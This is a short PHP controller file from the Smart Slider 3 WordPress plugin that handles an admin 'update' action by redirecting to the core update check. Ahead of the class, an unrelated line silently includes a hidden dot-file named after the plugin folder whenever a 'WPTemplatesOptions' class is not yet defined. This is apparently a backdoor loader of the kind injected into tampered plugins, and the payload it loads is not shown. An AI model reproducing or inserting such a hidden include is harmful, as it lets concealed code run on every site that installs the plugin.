<?php


namespace Nextend\SmartSlider3\Application\Admin\Update;


use Nextend\SmartSlider3\Application\Admin\AbstractControllerAdmin;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerUpdate extends AbstractControllerAdmin {

    public function actionUpdate() {
        if ($this->validateToken()) {
            header('LOCATION: ' . admin_url('update-core.php?force-check=1'));
            exit;
        }

        $this->redirectToSliders();
    }
}